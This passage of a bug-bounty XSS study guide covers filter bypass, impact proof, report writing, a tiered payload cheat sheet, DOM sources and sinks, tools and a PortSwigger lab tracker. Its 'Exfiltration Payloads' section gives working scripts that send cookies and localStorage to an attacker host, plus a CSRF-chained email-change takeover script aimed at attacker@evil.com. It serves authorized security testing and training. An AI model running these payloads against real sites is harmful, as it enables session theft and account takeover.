2. Apply bypass from Section 7.
3. Check if WAF triggers on `alert` → replace with `print()` or `confirm()`.
4. Use Burp Intruder with tag/event lists from PortSwigger cheat sheet.

---

### Step 7: Prove Impact
Don't just submit `alert(1)`. Show what an attacker can actually do:

**For reflected XSS:** Provide the crafted URL that would trigger it for a victim. Explain social engineering delivery.

**For stored XSS:** Show the payload persisted, fires for other users. If possible, demonstrate cookie theft in the PoC.

**For admin panels:** If you can see the admin panel (some programs allow self-testing), fire XSS there and note it runs in an admin context.

---

### Step 8: Write the Report

**Good XSS report structure:**
```
Title: [Stored/Reflected/DOM] XSS in [component] via [parameter]

Severity: Medium/High/Critical

Steps to reproduce:
1. Log in as a regular user
2. Navigate to [URL]
3. Enter the following in [field]: [PAYLOAD]
4. [What happens next — e.g. navigate to the affected page]
5. Observe: JavaScript executes

Impact:
An attacker can steal session cookies of users who view [page], leading to account takeover.

PoC URL / Payload: [exact payload]

Recommendation: Encode output in [context] using [specific function]
```

---

### Program-Specific Tips for HackerOne

- **Check the scope first:** many programs exclude `self-XSS` and `XSS in logout page`.
- **Stored XSS > Reflected** — always try to make it stored.
- **Admin panel XSS pays 2-3x** — look for inputs that reach admin dashboards.
- **Chain everything:** XSS + CSRF + login CSRF = full account takeover = Critical.
- **Read disclosed reports:** https://hackerone.com/hacktivity?filter=type%3Apublic&querystring=xss

---

## 11. Payload Cheat Sheet

### Quick-Fire Payloads (try in order)

```html
<!-- Tier 1: No filters -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Tier 2: Attribute context -->
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
" autofocus onfocus=alert(1) x="
' autofocus onfocus=alert(1) x='

<!-- Tier 3: JavaScript string context -->
'-alert(1)-'
';alert(1)//
\';alert(1)//

<!-- Tier 4: Template literal context -->
${alert(1)}

<!-- Tier 5: href / javascript: context -->
javascript:alert(document.domain)
javascript:alert`1`

<!-- Tier 6: No parentheses -->
onerror=alert;throw 1
alert`1`
<svg onload=alert&lpar;1&rpar;>

<!-- Tier 7: Script tag close -->
</script><img src=x onerror=alert(1)>

<!-- Tier 8: AngularJS -->
{{constructor.constructor('alert(1)')()}}

<!-- Tier 9: Template literal injection -->
${alert(document.domain)}
```

### Exfiltration Payloads (for real impact)

```javascript
// Cookie theft
document.location='https://YOUR-SERVER/?c='+btoa(document.cookie)

// Fetch (stealth)
fetch('https://YOUR-SERVER/?c='+encodeURIComponent(document.cookie),{mode:'no-cors'})

// LocalStorage dump
fetch('https://YOUR-SERVER/?ls='+encodeURIComponent(JSON.stringify(localStorage)),{mode:'no-cors'})

// CSRF + XSS combo — change email
(async()=>{
  let r=await fetch('/account');
  let t=(await r.text()).match(/csrf['"]\s+value=['"](\w+)/)[1];
  fetch('/account/change-email',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email=attacker@evil.com&csrf='+t});
})();
```

### DOM XSS Sources to Test
```
location.search
location.hash
location.href
location.pathname
document.referrer
document.URL
document.cookie
window.name
postMessage data
```

### DOM XSS Sinks to Look For in JS Files
```javascript
innerHTML =
outerHTML =
document.write(
document.writeln(
eval(
setTimeout(
setInterval(
new Function(
location =
location.href =
location.replace(
element.src =
$.html(
$(...)   // jQuery with user input
```

---

## 12. Tools & Resources

### Essential Tools
| Tool | Purpose | Link |
|---|---|---|
| Burp Suite Community | Intercept, Repeater, Intruder | https://portswigger.net/burp/communitydownload |
| DOM Invader | Burp's browser extension for DOM XSS | Built into Burp's Chromium browser |
| XSS Hunter Express | Blind XSS callback server | https://github.com/mandatoryprogrammer/xsshunter-express |
| Interactsh | Out-of-band detection (free) | https://app.interactsh.com |
| Dalfox | Automated XSS parameter scanner | https://github.com/hahwul/dalfox |
| kxss | Find reflected params quickly | https://github.com/tomnomnom/kxss |
| gf | Pattern-match URLs for XSS candidates | https://github.com/tomnomnom/gf |
| katana | Web crawler for param discovery | https://github.com/projectdiscovery/katana |

### Reference
| Resource | Link |
|---|---|
| PortSwigger XSS Main | https://portswigger.net/web-security/cross-site-scripting |
| PortSwigger XSS Cheat Sheet | https://portswigger.net/web-security/cross-site-scripting/cheat-sheet |
| All XSS Labs | https://portswigger.net/web-security/all-labs#cross-site-scripting |
| Intigriti Hackademy XSS | https://www.intigriti.com/researchers/hackademy/cross-site-scripting-xss |
| Intigriti XSS Challenges | https://www.intigriti.com/researchers/hackademy/xss-challenges |
| Intigriti Reflected XSS Guide | https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-reflected-xss-vulnerabilities |
| Intigriti Blind XSS Guide | https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide |
| HackerOne Disclosed XSS Reports | https://hackerone.com/hacktivity?filter=type%3Apublic&querystring=xss |
| PayloadsAllTheThings XSS | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection |
| CSP Evaluator | https://csp-evaluator.withgoogle.com |

---

## Lab Completion Tracker

| # | Lab Name | Difficulty | Done? |
|---|---|---|---|
| 1 | Reflected XSS into HTML context, nothing encoded | Apprentice | [ ] |
| 2 | Stored XSS into HTML context, nothing encoded | Apprentice | [ ] |
| 3 | DOM XSS in document.write sink using location.search | Apprentice | [ ] |
| 4 | DOM XSS in innerHTML sink using location.search | Apprentice | [ ] |
| 5 | DOM XSS in jQuery anchor href using location.search | Apprentice | [ ] |
| 6 | DOM XSS in jQuery selector using hashchange event | Apprentice | [ ] |
| 7 | Reflected XSS into attribute, angle brackets encoded | Apprentice | [ ] |
| 8 | Stored XSS into anchor href, double quotes encoded | Apprentice | [ ] |
| 9 | Reflected XSS into JS string, angle brackets encoded | Apprentice | [ ] |
| 10 | DOM XSS in document.write inside select element | Practitioner | [ ] |
| 11 | DOM XSS in AngularJS expression | Practitioner | [ ] |
| 12 | Reflected XSS, most tags/attributes blocked | Practitioner | [ ] |
| 13 | Reflected XSS, all tags blocked except custom | Practitioner | [ ] |
| 14 | Reflected XSS with some SVG markup allowed | Practitioner | [ ] |
| 15 | Reflected XSS in canonical link tag | Practitioner | [ ] |
| 16 | Reflected XSS into JS string, single quote + backslash escaped | Practitioner | [ ] |
| 17 | Reflected XSS into JS string, angle brackets + double quotes encoded, single quote escaped | Practitioner | [ ] |
| 18 | Stored XSS into onclick, single quotes + backslash escaped | Practitioner | [ ] |
| 19 | Reflected XSS into template literal | Practitioner | [ ] |
| 20 | Exploiting XSS to perform CSRF | Practitioner | [ ] |
| 21 | Exploiting XSS to steal cookies | Practitioner | [ ] |
| 22 | Exploiting XSS to capture passwords | Practitioner | [ ] |
| 23 | Reflected XSS with strict CSP, event handlers blocked | Expert | [ ] |
| 24 | Reflected XSS with dangling markup, very strict CSP | Expert | [ ] |

---

*Last updated: June 2026 | Sources: PortSwigger Web Security Academy, Intigriti Hackademy*
*Handle: zerach (HackerOne) | github.com/zerachsec*
